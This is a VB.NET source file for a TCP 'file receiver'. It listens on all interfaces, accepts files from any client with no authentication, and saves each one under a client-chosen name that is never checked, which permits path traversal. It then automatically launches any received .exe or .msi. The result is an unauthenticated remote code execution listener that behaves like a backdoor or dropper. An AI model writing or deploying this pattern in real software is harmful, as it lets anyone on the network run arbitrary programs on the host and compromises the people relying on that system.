Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading.Tasks
Imports Newtonsoft.Json

Public Class TcpFileReceiver
    Private Const bufferSize As Integer = 1024

    Public Async Function StartListeningAsync(port As Integer) As Task
        Dim listener As TcpListener = Nothing
        Try
            listener = New TcpListener(IPAddress.Any, port)
            listener.Start()

            My.Application.Log.WriteEntry("Waiting for incoming connection...")

            While True
                Dim client As TcpClient = Await listener.AcceptTcpClientAsync()
                My.Application.Log.WriteEntry("Client connected.")

                Dim receiveTask = ReceiveFileAsync(client)
            End While
        Catch ex As Exception
            My.Application.Log.WriteEntry($"Error: {ex.Message}")
        Finally
            If listener IsNot Nothing Then
                listener.Stop()
            End If
        End Try
    End Function

    Private Async Function ReceiveFileAsync(client As TcpClient) As Task
        Dim stream As NetworkStream = client.GetStream()

        Dim jsonBuffer(8196) As Byte
        Dim jsonBytesRead As Integer = stream.Read(jsonBuffer, 0, jsonBuffer.Length)
        Dim json As String = Encoding.UTF8.GetString(jsonBuffer, 0, jsonBytesRead)
        Dim fileInfo As New With {.FileName = "", .BufferSize = 0}
        fileInfo = JsonConvert.DeserializeAnonymousType(json, fileInfo)
        Dim saveFilePath As String = Path.Combine(Path.GetTempPath(), $"{fileInfo.FileName}")

        Dim acknowledgmentBytes As Byte() = Encoding.UTF8.GetBytes("ACK_START")
        Await stream.WriteAsync(acknowledgmentBytes, 0, acknowledgmentBytes.Length)

        Using fileStream As New FileStream(saveFilePath, FileMode.Create)
            Dim buffer(fileInfo.BufferSize - 1) As Byte
            Dim bytesRead As Integer

            Do
                bytesRead = Await stream.ReadAsync(buffer, 0, buffer.Length)
                fileStream.Write(buffer, 0, bytesRead)
            Loop While bytesRead > 0
        End Using

        My.Application.Log.WriteEntry($"File received and saved as {saveFilePath}")
        Dim fileExtension As String = Path.GetExtension(saveFilePath)

        ' Check if it's an MSI or EXE file and execute it
        If fileExtension.Equals(".msi", StringComparison.OrdinalIgnoreCase) OrElse fileExtension.Equals(".exe", StringComparison.OrdinalIgnoreCase) Then
            Dim startInfo As New ProcessStartInfo()
            startInfo.UseShellExecute = True
            startInfo.WorkingDirectory = Path.GetTempPath()
            startInfo.FileName = saveFilePath
            Process.Start(startInfo)
        End If

        ' Close the network stream and client
        stream.Close()
        client.Close()
    End Function
End Class